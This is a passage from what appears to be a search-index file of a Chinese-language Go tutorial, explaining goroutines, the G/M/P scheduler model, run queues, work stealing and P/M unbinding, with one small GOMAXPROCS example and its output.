\u800c\u200b\u5e76\u884c\u200b\u200b\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5e76\u53d1\uff0c\u4e0d\u540c\u903b\u8f91\u7531\u4e8eCPU\u7684\u591a\u6838\uff0c\u5206\u914d\u5728\u4e0d\u540c\u7684\u6838\u4e0a\u53ef\u4ee5\u5728\u7269\u7406\u65f6\u95f4\u4e0a\u540c\u65f6\u6267\u884c\u3002\u8fd9\u79cd\u72b6\u6001\u5176\u5b9e\u5f88\u96be\u5b9e\u73b0\uff0c\u56e0\u4e3a\u5f80\u5f80\u4efb\u4e00\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b83\u672c\u8eab\u8dd1\u7684\u7a0b\u5e8f\u975e\u5e38\u591a\uff0c\u8fdc\u5927\u4e8eCPU\u6838\u6570\u3002</p>"},{"location":"go/goroutine/#_3","title":"\u7ebf\u7a0b\u4e0e\u534f\u7a0b","text":"<p>\u7ebf\u7a0b\u200b\u662f\u6267\u884c\u5355\u4f4d\uff0c\u76f8\u5f53\u4e8e\u5de5\u5382\u91cc\u7684\u751f\u4ea7\u7ebf\u3002\u64cd\u4f5c\u7cfb\u7edf\u662f\u6309\u7ebf\u7a0b\u5206\u914d\u65f6\u95f4\u7247\uff0c\u6240\u4ee5\u7a0b\u5e8f\u7684\u7ebf\u7a0b\u8d8a\u591a\u83b7\u5f97\u7684\u6267\u884c\u65f6\u95f4\u4e5f\u5c31\u8d8a\u957f\u3002\u7ebf\u7a0b\u662f\u5728\u7cfb\u7edf\u7a7a\u95f4\u5b9e\u73b0\u7684\uff0c\u800c\u200b\u534f\u7a0b\u200b\u662f\u5728\u7528\u6237\u7a7a\u95f4\u5b9e\u73b0\u7684\uff0c\u64cd\u4f5c\u7cfb\u7edf\u6839\u672c\u4e0d\u77e5\u9053\u534f\u7a0b\u3002</p> <p>\u6bd4\u5982\u67d0\u4e2a\u7ebf\u7a0b\u4e0a\u6709A\u3001B\u4e24\u4e2a\u4efb\u52a1\uff0c\u82e5A\u6709\u6b7b\u5faa\u73af\u6216\u8005A\u7b49\u5f85\u7f51\u7edc\u54cd\u5e94\u7b49\u5c31\u4f1a\u53d1\u751fB\u88ab\u997f\u6b7b\u7684\u60c5\u51b5\uff0c\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0cA\u5c31\u4f1a\u4e3b\u52a8\u8ba9\u7ed9B\u6216\u8005\u8c03\u5ea6\u5668\u53bb\u6267\u884c\u3002\u8fd9\u5c31\u662f\u534f\u7a0b\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u4efb\u52a1\u4e4b\u95f4\u76f8\u4e92\u534f\u5546\uff0c\u5c5e\u4e8e\u534f\u4f5c\u5f0f\u591a\u4efb\u52a1\u7cfb\u7edf\uff0c\u901a\u5e38\u662f\u5728\u7528\u6237\u7a7a\u95f4\u5b9e\u73b0\u4e00\u4e2a\u6846\u67b6\u3002\u800c\u591a\u7ebf\u7a0b\u662f\u62a2\u5360\u5f0f\u8c03\u5ea6\uff0c\u4e0d\u7ba1\u67d0\u4e2a\u7a0b\u5e8f\u4f1a\u4e0d\u4f1a\u4e3b\u52a8\u8ba9\u51fa\uff0c\u5f53\u524d\u65f6\u95f4\u7247\u6267\u884c\u5b8c\u5c31\u4f1a\u88ab\u64cd\u4f5c\u7cfb\u7edf\u5f3a\u8feb\u5206\u7ed9\u5176\u4ed6\u7ebf\u7a0b\u3002</p> <p>\u7a0b\u5e8f\u7b49\u4e8e\u7b97\u6cd5\u52a0\u6570\u636e\uff0c\u7b97\u6cd5\u76f8\u5f53\u4e8e\u4e00\u4e2a\u89e3\u51b3\u95ee\u9898\u7684\u8fc7\u7a0b\uff0c\u6570\u636e\u53c8\u5206\u4e3a\u7cfb\u7edf\u6570\u636e\u548c\u7528\u6237\u6570\u636e\u3002\u7528\u6237\u6570\u636e\u4fdd\u5b58\u5728\u7528\u6237\u5806\u6808\u4e0a\u3002\u64cd\u4f5c\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d\u4e00\u4e2a\u6808\uff0c\u5927\u591a\u7528\u6765\u4fdd\u5b58\u5c40\u90e8\u53d8\u91cf\uff0c\u901a\u5e38\u7f16\u8bd1\u671f\u5c31\u80fd\u786e\u5b9a\uff0c\u8fd0\u884c\u671f\u901a\u8fc7\u5bc4\u5b58\u5668\u8bbf\u95ee\uff0c\u65e0\u9700\u5783\u573e\u56de\u6536\u3002\u800c\u5806\u5185\u5b58\u5c5e\u4e8e\u8fdb\u7a0b\uff0c\u8fdb\u7a0b\u5185\u7684\u7ebf\u7a0b\u5171\u4eab\uff0c\u9700\u8981\u8fd0\u884c\u671f\u52a8\u6001\u5206\u914d\u4ee5\u53ca\u5783\u573e\u56de\u6536\u3002</p>"},{"location":"go/goroutine/#_4","title":"\u8fd0\u884c\u65f6","text":"<p>\u73b0\u4ee3\u7684\u7f16\u7a0b\u8bed\u8a00\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u5f80\u5f80\u662f\u4f7f\u7528\u4e00\u4e2a\u6807\u51c6\u5e93\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u63d0\u4f9bAPI\u7684\uff0c\u5206\u914d\u5185\u5b58\u4e5f\u5f80\u5f80\u4f1a\u5411\u64cd\u4f5c\u7cfb\u7edf\u63d0\u524d\u7533\u8bf7\u4e00\u5927\u5757\u5185\u5b58\uff0c\u901a\u8fc7\u8fd9\u6837\u4e00\u5c42\u62bd\u8c61\u6765\u51cf\u5c11\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u7684\u5207\u6362\u6765\u63d0\u5347\u6548\u7387\uff0c\u6211\u4eec\u628a\u8fd9\u5c42\u62bd\u8c61\u53eb\u505a\u200bruntime(\u8fd0\u884c\u65f6)\u3002\u5b83\u5c31\u50cf\u4e00\u4e2a\u5f31\u5316\u7248\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u53ef\u4ee5\u9488\u5bf9\u7528\u6237\u7a7a\u95f4\u5185\u7684\u4ee3\u7801\uff0c\u7ed3\u5408\u5f53\u524d\u8bed\u8a00\u7684\u7279\u6027\u505a\u5927\u91cf\u7684\u4f18\u5316\u3002</p> <p>Go\u8fd0\u884c\u65f6\u7b2c\u4e00\u4e2a\u62bd\u8c61\u51fa\u7684\u6982\u5ff5\u5c31\u662fP(Processor)\uff0c\u76f8\u5f53\u4e8e\u5904\u7406\u5668\u3002\u7269\u7406\u4e0a\u6709\u591a\u5c11\u4e2aCPU\u3001\u6709\u591a\u5c11\u4e2a\u6838\uff0cruntime\u5e76\u4e0d\u5173\u5fc3\uff0c\u5b83\u662f\u5728OS\u4e0a\u7684\u4e00\u5c42\u62bd\u8c61\uff0cos\u624d\u662f\u5728\u786c\u4ef6\u7684\u4e0a\u4e00\u5c42\u62bd\u8c61\u3002runtime\u8ba4\u4e3a\u5728\u5f53\u524d\u7684\u73af\u5883\u5185\u53ea\u6709\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7P\u6765\u8bbe\u5b9a\u5e76\u53d1\u7684\u6570\u91cf\uff0c\u540c\u65f6\u80fd\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u5185\u7684\u591a\u5c11\u4e2a\u5e76\u53d1\u4efb\u52a1\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u62bd\u8c61\u662fM(Machine)\uff0c\u5bf9\u5e94\u4e86\u4e00\u4e2a\u7cfb\u7edf\u7ebf\u7a0b\uff0c\u662f\u5bf9\u7ebf\u7a0b\u7684\u5305\u88c5\uff0c\u4e5f\u5c31\u662f\u8bf4P\u63a7\u5236\u4e86\u540c\u65f6\u6709\u591a\u5c11\u4e2aM\u5728\u6267\u884c\u3002\u5b83\u662f\u5b9e\u9645\u6267\u884c\u4f53\uff0c\u548cP\u7ed1\u5b9a\uff0c\u4ee5\u8c03\u5ea6\u5faa\u73af\u65b9\u5f0f\u4e0d\u65ad\u6267\u884cG\u5e76\u53d1\u4efb\u52a1\u3002</p> <p>\u7b2c\u4e09\u4e2a\u62bd\u8c61\u5c31\u662fG(Goroutine)\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u4efb\u52a1\u8f7d\u4f53\uff0c\u6216\u8005\u8bf4\u8d44\u6e90\u5305\uff0c\u5305\u62ec\u4e86\u51fd\u6570\u5730\u5740\uff0c\u9700\u8981\u7684\u53c2\u6570\uff0c\u6240\u9700\u7684\u5185\u5b58\u3002\u5f53\u6211\u4eec\u4f7f\u7528<code>go func(){}()</code>\u65f6\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u521b\u5efa\u4e86\u4e00\u4e2aG\u5bf9\u8c61\u3002</p> <p>\u4e3a\u4ec0\u4e48G\u9700\u8981\u5185\u5b58\uff0c\u6309\u8bf4M\u76f8\u5f53\u4e8e\u7ebf\u7a0b\u4e5f\u5c31\u5e94\u8be5\u6709\u4e86\u6808\u5185\u5b58\uff1f\u5b9e\u9645\u4e0a\u5b83\u4eec\u90fd\u6709\u81ea\u5df1\u7684\u5185\u5b58\uff0cG\u4e2d\u7684\u5185\u5b58\u4e3aG.stack(\u9ed8\u8ba4\u5927\u5c0f2KB)\uff0cM\u4e2d\u7684\u5185\u5b58\u4e3aG0\u3002G\u5728M\u4e0a\u8fd0\u884c\uff0c\u5c31\u50cf\u662f\u5217\u8f66\u5728\u7ebf\u8def\u4e0a\u8fd0\u884c\uff0c\u7ebf\u8def\u672c\u8eab\u4e5f\u9700\u8981\u53bb\u6295\u5165\u8d44\u6e90\u7ef4\u62a4\u3002\u800c\u628a\u4e24\u5757\u5185\u5b58\u5206\u5f00\uff0c\u662f\u56e0\u4e3aM\u6240\u9700\u7684\u5185\u5b58\u6bd4\u8f83\u8fde\u7eed\u3001\u76f8\u5bf9\u56fa\u5b9a\u3001\u903b\u8f91\u5b8c\u6574\uff0cG\u5374\u4f1a\u56e0\u4e3a\u5404\u79cd\u5404\u6837\u7684\u539f\u56e0\u6216\u8005\u5f02\u5e38\u53ef\u80fd\u4f1a\u8c03\u5ea6\u5230\u522b\u7684M\u4e0a\u53bb\u3002</p> <p>G\u3001M\u3001P\u5171\u540c\u6784\u6210\u4e86\u591a\u4efb\u52a1\u5e76\u53d1\u6267\u884c\u7684\u57fa\u672c\u6a21\u5f0f\uff0cP\u7528\u6765\u63a7\u5236\u540c\u65f6\u6709\u591a\u5c11\u4e2a\u5e76\u53d1\u4efb\u52a1\u6267\u884c\uff0cM\u5bf9\u5e94\u5230\u67d0\u4e2a\u7ebf\u7a0b\uff0cG\u4ee3\u8868\u4e86go func\u8bed\u53e5\u7ffb\u8bd1\u7684\u4e00\u4e2a\u4efb\u52a1\u5305\uff0c\u6700\u7ec8\u8fd8\u5f97\u6709\u4e2a\u8c03\u5ea6\u5668\u7edf\u5408\u8d77\u6765\uff0c\u628aG\u653e\u5230\u5408\u9002\u7684M\u4e0a\u53bb\u6267\u884c\u3002</p>"},{"location":"go/goroutine/#_5","title":"\u4efb\u52a1\u5e73\u8861","text":""},{"location":"go/goroutine/#_6","title":"\u6b63\u5411\u5206\u6790","text":"<p>\u5f53\u6211\u4eec\u5728\u4e00\u4e2afor\u5faa\u73af\u4e2d\u521b\u5efa\u4e86\u6210\u5343\u4e0a\u4e07\u4e2a\u5e76\u53d1\u4efb\u52a1\u65f6\uff0c\u5b83\u4eec\u5e76\u4e0d\u662f\u7acb\u5373\u6267\u884c\u7684\uff0c\u800c\u662f\u6253\u5305\u6210\u4e00\u4e2a\u4e2aG\u5bf9\u8c61\u4fdd\u5b58\u5728\u4e24\u4e2a\u961f\u5217\u4e2d(P\u672c\u5730\u961f\u5217\u548cG\u5168\u5c40\u961f\u5217)\u3002</p> <p>\u5047\u8bbe\u5f53\u524d\u53ea\u67094\u4e2aP\uff0c\u5728main\u51fd\u6570\u6267\u884c\u7684\u65f6\u5019\u5c31\u9700\u8981\u4e00\u4e2aP1/M1\u7ed1\u5b9a\u4f53\uff0cmain\u4e2d\u521b\u5efa\u7684\u5176\u4ed6go func\u5c31\u4f1a\u6253\u5305\u6210G\u5bf9\u8c61\u653e\u5728P1.queue\u4e2d\u3002\u4e5f\u5c31\u662f\u8bf4\u4efb\u4e00M\u5185\u521b\u5efa\u7684G\u90fd\u4f1a\u4fdd\u5b58\u5728\u5f53\u524d\u8fd9\u4e2aP\u7684\u672c\u5730\u961f\u5217\u4e2d\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u653e\u5728P2\u3001P3\u3001P4\u7684\u961f\u5217\u4e2d\uff1f\u653e\u5728\u522b\u7684\u961f\u5217\u5c31\u9700\u8981\u53bb\u5224\u65ad\u8fd9\u4e2aP\u662f\u4e0d\u662f\u95f2\u7f6e\u7684\uff0c\u8fd8\u53ef\u80fd\u9700\u8981\u52a0\u9501\u7b49\u7b49\uff0c\u4f1a\u53d8\u5f97\u5f88\u590d\u6742\u3002</p> <p>\u90a3\u4e48\u5982\u679c\u5728main\u4e2d\u521b\u5efa\u4e861000\u4e2aG\uff0c\u5b83\u4eec\u5c31\u5f97\u7b49P1/M1\u4e2d\u5f53\u524d\u7684\u4efb\u52a1\u6267\u884c\u5b8c\u4e86\u624d\u4f1a\u5f97\u5230\u6267\u884c\uff0c\u53ef\u80fdP2\u3001P3\u3001P4\u90fd\u662f\u95f2\u7f6e\u7684\uff0c\u8fd9\u660e\u663e\u4e0d\u5408\u7406\u3002\u5982\u4f55\u5728\u591a\u4e2aP\u4e4b\u95f4\u53bb\u5e73\u8861\u4efb\u52a1\u5462\uff1f\u4f7f\u7528\u4e86\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u89c4\u5b9a\u4e86\u6bcf\u4e2aP\u672c\u5730\u961f\u5217\u53ea\u80fd\u653e256\u4e2aG\uff0c\u4e00\u6b21\u653e\u7684\u8fc7\u591a\u65f6\u4f1a\u6309\u4e00\u5b9a\u89c4\u5219\u6bd4\u5982\u653e\u4e00\u534a\u5230\u5168\u5c40\u961f\u5217\u4e2d\u53bb\uff1b\u53e6\u4e00\u79cd\u662f\u67d0\u4e2aP\u82e5\u95f2\u7f6e\u4e86\u5c31\u4f1a\u5728\u5168\u5c40\u961f\u5217\u4e2d\u53bb\u627e(\u53ef\u80fd\u6709\u5f88\u591aP\u90fd\u5728\u5168\u5c40\u4e2d\u627e\uff0c\u5c31\u9700\u8981\u6392\u961f\u53bb\u627e)\uff0c\u627e\u5230\u4e86\u5c31\u628a\u4e00\u90e8\u5206\u4efb\u52a1\u79fb\u52a8\u5230\u81ea\u5df1\u7684\u672c\u5730\u961f\u5217\u4e2d\uff0c\u6ca1\u6709\u627e\u5230\u5c31\u4f1a\u53bb\u5176\u4ed6P\u4e2d\u5077\u4e00\u90e8\u5206\u4efb\u52a1\u8fc7\u6765\uff0c\u4ece\u5168\u5c40\u961f\u91cc\u6216\u5176\u4ed6P\u4e2d\u5077\u90fd\u662f\u9700\u8981\u52a0\u9501\u7684\uff0c\u6548\u7387\u76f8\u5bf9\u4f1a\u4f4e\u4e00\u4e9b\u3002</p> <p>\u8fd9\u6837\u7684\u5e73\u8861\u65b9\u5f0f\u4e5f\u5c31\u51b3\u5b9a\u4e86\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\u786e\u5b9a\u54ea\u4e2a\u65b9\u6cd5\u5148\u6267\u884c\uff0c\u54ea\u4e2a\u540e\u6267\u884c\uff0c\u9664\u975e\u6211\u4eec\u81ea\u5df1\u5199\u903b\u8f91\u53bb\u5224\u65ad\u5148\u540e\u3002\u6211\u4eec\u518d\u6765\u770b\u4e00\u4e2a\u5173\u4e8e\u6267\u884c\u987a\u5e8f\u7684\u793a\u4f8b:</p> <pre><code>func main() {\n    runtime.GOMAXPROCS(1) // \u8bbe\u7f6eP\u4e3a1\n    for i := 0; i &lt; 10; i++ {\n        go func(id int) { // \u521b\u5efa10\u4e2aG\n            time.Sleep(time.Second)\n            fmt.Println(id)\n        }(i)\n    }\n    time.Sleep(time.Second * 2)\n}\n</code></pre> <p>\u6267\u884c\u7ed3\u679c:</p> <pre><code>[ubuntu] ~/.mac/gocode $ go run goroutine.go\n9\n0\n1\n2\n3\n4\n5\n6\n7\n8\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u5f53P\u4e3a1\u7684\u65f6\u5019\uff0c\u5b83\u4e0d\u662f\u987a\u5e8f\u8f93\u51fa\u7684\uff0c9\u603b\u662f\u5728\u7b2c\u4e00\u4e2a\uff1f  </p> <p>\u6bcf\u4e2aP\u7684\u672c\u5730\u961f\u5217\u4e2d\u5176\u5b9e\u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff0crunnext[1]\u548crunq[256]\u3002\u5f53\u6211\u4eec\u6bcf\u6b21\u6dfb\u52a0\u4e00\u4e2a\u4efb\u52a1\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u5148\u653e\u5728runnext\u4e2d\uff0c\u518d\u6dfb\u52a0\u4e00\u4e2a\u4efb\u52a1\u65f6\uff0c\u4f1a\u628a\u65b0\u6dfb\u52a0\u7684\u653e\u5728runnext\uff0c\u4e4b\u524d\u6dfb\u52a0\u7684\u653e\u5728runq\u4e2d\u3002runnext\u603b\u662f\u4fdd\u7559\u7528\u6237\u6700\u540e\u521b\u5efa\u7684\u4efb\u52a1\uff0c\u6267\u884c\u7684\u65f6\u5019\u5148\u67e5runnext\u53bb\u6267\u884c\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8981\u6709runnext\u7684\u8bbe\u8ba1\uff1f</p> <p>\u5047\u8bbe\u53ea\u521b\u5efa\u4e86\u4e00\u4e2a\u5e76\u53d1\u4efb\u52a1\uff0c\u4e5f\u653e\u5728runq\u4e2d\u8ba9\u522b\u7684P\u53bb\u62a2\u6ca1\u6709\u5fc5\u8981\uff0c\u800c\u4e14\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u6211\u4eec\u4e0d\u4f1a\u53bb\u6279\u91cf\u521b\u5efaG\uff1b\u53e6\u5916\u82e5runq\u65e2\u7528\u6765P1\u6267\u884c\u53c8\u8ba9P2\u3001P3\u53bb\u5077\uff0c\u90a3\u5c31\u53c8\u4f1a\u6d89\u53ca\u5230\u52a0\u9501\u3002</p> <p>\u90a3\u4e48\u4e3a\u4ec0\u4e48\u662fG9\u653e\u5728runnext\uff0c\u800c\u4e0d\u662fG0\uff1f</p> <p>\u56e0\u4e3a\u653e\u5728runnext\u4ee5\u540e\u6211\u4eec\u65e0\u6cd5\u4fdd\u8bc1\u8fd8\u6709\u591a\u5c11\u903b\u8f91\u6267\u884c\u5b8c\u624d\u8f6e\u5230\u5b83\uff0c\u5c31\u53ef\u80fd\u4f1arunq\u4e2d\u7684\u4efb\u52a1\u90fd\u88ab\u5077\u8d70\u4e86\u4e14\u6267\u884c\u5b8c\u4e86G0\u624d\u4f1a\u6267\u884c\uff0c\u8fd9\u5bf9G0\u5f88\u4e0d\u516c\u5e73\u3002</p> <p>\u663e\u7136\u4efb\u52a1\u88ab\u5206\u6210\u4e86\u4e09\u4e2a\u6027\u80fd\u5c42\u6b21\uff0crunnext\u662f\u5b8c\u5168\u79c1\u6709\u7684\uff0crunq\u5c5e\u4e8e\u539f\u5b50\u64cd\u4f5c(\u539f\u5b50\u64cd\u4f5c\u5bf9CPU\u6765\u8bb2\u4e5f\u662f\u9501\uff0c\u9501\u7684\u662f\u5730\u5740\u603b\u7ebf)\uff0cGlobal\u5c5e\u4e8e\u4e00\u5b9a\u8981\u52a0mutex\u9501\u7684\uff0c\u8fd9\u4e09\u4e2a\u5c42\u6b21\u4ea7\u751f\u8d44\u6e90\u7ade\u4e89\u7684\u53ef\u80fd\u6027\u9010\u6b65\u589e\u5927\u3002</p>"},{"location":"go/goroutine/#_7","title":"\u9006\u5411\u5206\u6790","text":"<p>\u5728\u6700\u5f00\u59cb\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5148\u8bbe\u8ba1\u4e3a\u4e00\u4e2a\u5faa\u73af\u961f\u5217\uff0c\u5b83\u5e95\u5c42\u7ed3\u6784\u53ef\u80fd\u5c31\u662f\u4e00\u4e2a\u6570\u7ec4\u3002\u95ee\u9898\u5728\u4e8e\uff0c\u5f53\u6709\u591a\u4e2a\u4eba\u53bb\u7ade\u4e89\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u6570\u7ec4\u5c31\u4f1a\u5b58\u5728\u8d44\u6e90\u7ade\u4e89\u6548\u5e94\uff0c\u6211\u4eec\u5c31\u4f1a\u8003\u8651\u52a0\u5165\u9501\uff0c\u663e\u7136\u8fd9\u79cd\u6548\u7387\u662f\u6700\u4f4e\u7684\u3002  </p> <p>\u5047\u8bbe\u73b0\u5728\u67093\u4e2aP/M\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u628a\u4e00\u4e2a\u5927\u7684\u961f\u5217\u62c6\u5206\u62103\u4e2a\u5c0f\u7684\u961f\u5217\uff0c\u8ba9\u6bcf\u4e2aP/M\u6301\u6709\u4e00\u4e2a\u79c1\u6709\u7684\u961f\u5217\uff0c\u8fd9\u79cd\u4f18\u5316\u7b56\u7565\u4f7f\u5f97\u9501\u7684\u95ee\u9898\u53ef\u4ee5\u89e3\u51b3\u6389\u3002\u4f46\u4e5f\u5e26\u6765\u65b0\u7684\u95ee\u9898\uff0c\u53ef\u80fdP1\u5df2\u6267\u884c\u5b8c\u81ea\u5df1\u7684\u4efb\u52a1\uff0cP2\u3001P3\u8fd8\u5f97\u6267\u884c\u5f88\u4e45\uff0c\u6211\u4eec\u53ef\u80fd\u4e00\u5f00\u59cb\u6309\u4efb\u52a1\u7684\u6570\u91cf\u5e73\u5747\u5206\u914d\u81f3\u5404\u4e2a\u79c1\u6709\u961f\u5217\uff0c\u4f46\u6709\u7684\u4efb\u52a1\u6267\u884c\u65f6\u95f4\u5f88\u957f\uff0c\u6709\u7684\u4efb\u52a1\u5f88\u5feb\u5c31\u80fd\u6267\u884c\u5b8c\u3002  </p> <p>\u56e0\u6b64\uff0cP1\u5e94\u8be5\u53bbP2\u3001P3\u4e2d\u62ff\u53d6\u4efb\u52a1\u624d\u662f\u5408\u7406\u7684\uff0c\u6240\u6709\u4eba\u6709\u4e49\u52a1\u53bb\u5b8c\u6210\u6574\u4e2a\u7cfb\u7edf\u7684\u4efb\u52a1\u3002P1\u76f4\u63a5\u53bb\u62ff\u5c31\u4f1a\u548cP2\u3001P3\u6253\u8d77\u6765\u5f62\u6210\u7ade\u4e89\u6548\u5e94\uff0c\u7b2c\u4e8c\u6b65\u7684\u4f18\u5316\u7b56\u7565\u5c31\u662f\u4fdd\u7559\u4e00\u4e2a\u5168\u5c40\u961f\u5217\uff0cP1\u53ef\u4ee5\u5148\u53bb\u5168\u5c40\u961f\u5217\u91cc\u627e\uff0c\u800cP2\u3001P3\u6709\u5f88\u5927\u6982\u7387\u662f\u5728\u672c\u5730\u961f\u5217\u53bb\u627e\u7684\uff0cP1\u83b7\u5f97\u9501\u7684\u6982\u7387\u5c31\u4f1a\u66f4\u5927\uff0c\u5168\u5c40\u961f\u5217\u4f7f\u5f97\u9501\u7684\u538b\u529b\u88ab\u5206\u644a\uff0c\u540c\u65f6\u4e5f\u4f7f\u5f97P2\u3001P3\u4e2d\u82e5\u6709\u591a\u4f59\u7684\u4efb\u52a1\u4e5f\u53ef\u4ee5\u653e\u8fdb\u53bb\u3002 </p> <p>\u5f53P1\u7684\u672c\u5730\u961f\u5217\u5df2\u6267\u884c\u5b8c\uff0c\u5168\u5c40\u961f\u5217\u4e2d\u7684\u4efb\u52a1\u4e5f\u88ab\u6267\u884c\u5b8c\u65f6\uff0c\u5b83\u5c31\u4f1a\u4efb\u9009P2\u6216P3\uff0c\u5f62\u6210\u76f4\u63a5\u7684\u7ade\u4e89\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u8003\u8651\u7684\u4f18\u5316\u7b56\u7565\uff0c\u5c31\u662f\u628a\u672c\u5730\u961f\u5217\u4e00\u5206\u4e3a\u4e8c\uff0c\u4e0a\u9762\u662frunnext\u7528\u4e8e\u672c\u5730\u6267\u884c\uff0c\u4e0b\u9762\u662frunq[256]\u7528\u6765\u7ed9P1\u5077\u7684\u3002</p> <p></p> <p>\u8fd9\u79cd\u7ed3\u6784\u5f88\u50cfCPU\u7684\u5b58\u50a8\u7ed3\u6784\uff0c\u901a\u8fc7\u5206\u6563\u8ddd\u79bb\u3001\u589e\u52a0\u5b58\u50a8\u5c42\u6b21\u6765\u51cf\u5c11\u76f4\u63a5\u7ade\u4e89\u51b2\u7a81\u7684\u6982\u7387\u3002</p>"},{"location":"go/goroutine/#_8","title":"\u8c03\u5ea6\u6267\u884c","text":""},{"location":"go/goroutine/#pm","title":"P\u3001M\u89e3\u7ed1","text":"<p>\u5f53\u6211\u4eec\u521b\u5efa\u4e00\u4e2aG\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u662f\u80cc\u540e\u7684\u8c03\u5ea6\u5668\u5728\u5f53\u524dM\u4e0a\u7684G0\u53bb\u6267\u884c\u7684\uff0c\u5b83\u53d1\u73b0\u6709\u65b0\u7684\u4efb\u52a1\u51fa\u73b0\u65f6\uff0c\u4f1a\u53d1\u51fa\u4e00\u4e2a\u5524\u9192\u4fe1\u53f7\uff0c\u53bb\u68c0\u67e5\u6709\u6ca1\u6709P\u7a7a\u95f2\u7684\uff0c\u4ee5\u53ca\u6709\u6ca1\u6709M\u662f\u4f11\u7720\u72b6\u6001\u7684\uff1f\u82e5P\u7a7a\u95f2\u4e14\u6ca1\u6709\u4f11\u7720\u7684M\uff0c\u5c31\u4f1a\u53bb\u521b\u5efa\u4e00\u4e2aM\u5bf9\u8c61\u3002\u6240\u4ee5\u5524\u9192\u64cd\u4f5c\u8981\u6709\u610f\u4e49\uff0c\u5c31\u5f97\u6709P\u95f2\u7740\u6ca1\u4e8b\u5e72\u3002</p> <p>\u90a3\u4e48M\u662f\u600e\u6837\u53d8\u4e3a\u4f11\u7720\u72b6\u6001\u7684\uff1f</p> <p>\u5f53\u4e00\u4e2aP\u548cM\u7ed1\u5b9a\u4e4b\u540e\uff0c\u5b83\u4f1a\u8fdb\u5165\u5230\u4e00\u4e2a\u8c03\u5ea6\u7a0b\u5e8f(Schedule\u51fd\u6570)\uff0c\u8c03\u5ea6\u7a0b\u5e8f\u4f1a\u53bb\u627eG\u5bf9\u8c61(\u6309runnext\u3001runq\u3001Global\u3001other P\u7684\u987a\u5e8f)\uff0c\u627e\u5230\u4e4b\u540e\u5185\u5b58\u7531G0\u4e0a\u6267\u884c\u5207\u6362\u5230G.stack\u4e0a\u53bb\u6267\u884c\uff0c\u6267\u884c\u5b8c\u6210\u4e4b\u540e\u8fdb\u5165\u6536\u5c3e\u9636\u6bb5\uff0c\u6e05\u7406\u73b0\u573a\u628aG\u5f53\u505a\u4e00\u4e2a\u5305\u88c5\u5bf9\u8c61\u8ba9\u5b83\u80fd\u91cd\u590d\u4f7f\u7528\u3002\u7136\u540e\u91cd\u65b0\u56de\u5230Schedule\u51fd\u6570\u5f62\u6210\u4e00\u4e2a\u8c03\u5ea6\u5faa\u73af\u3002</p> <p>\u8fd9\u4e2a\u5faa\u73af\u53ef\u80fd\u56e0\u4e3a\u627e\u4e0d\u5230G\u5bf9\u8c61\u800c\u4e2d\u65ad\uff0c\u6bd4\u5982\u8bf4\u5f53\u524d\u5c31\u53ea\u6709\u4e00\u4e2a\u4efb\u52a1\u3002\u90a3\u4e48P\u548cM\u5c31\u4f1a\u89e3\u7ed1\uff0cM\u4f1a\u8fdb\u5165\u4f11\u7720\u72b6\u6001\u3002</p> <p>\u8fd8\u6709\u4e00\u79cdP\u548cM\u89e3\u7ed1\u7684\u60c5\u51b5\uff0c\u6bd4\u5982\u5f53\u524d\u5728\u8fdb\u884c\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u800c\u8fd9\u4e2a\u7cfb\u7edf\u8c03\u7528\u82b1\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u8c03\u5ea6\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2aP\u62ff\u8d70\u5e72\u522b\u7684\u4e8b\uff0c\u800cM\u538b\u6839\u4e0d\u77e5\u9053\uff0c\u56e0\u4e3a\u5b83\u5728\u5185\u6838\u6001\uff0c\u7b49\u7cfb\u7edf\u8c03\u7528\u7ed3\u675f\u4ee5\u540eM\u53d1\u73b0\u627e\u4e0d\u5230P\uff0c\u90a3\u5b83\u5c31\u6ca1\u6cd5\u7ee7\u7eed\u6267\u884c\uff0c\u53ea\u80fd\u628a\u5f53\u524d\u7684\u4efb\u52a1\u72b6\u6001\u4fdd\u5b58\u56deG.stack\uff0c\u5728\u628a\u6267\u884c\u4e00\u534a\u7684\u4efb\u52a1\u91cd\u65b0\u653e\u56de\u961f\u5217\uff0cM\u518d\u6b21\u8fdb\u5165\u4f11\u7720\u72b6\u6001\uff0c\u6267\u884c\u4e00\u534a\u7684\u4efb\u52a1\u518d\u4e0b\u6b21\u9047\u5230P/M\u65f6\u63a5\u7740\u6267\u884c\u3002</p> 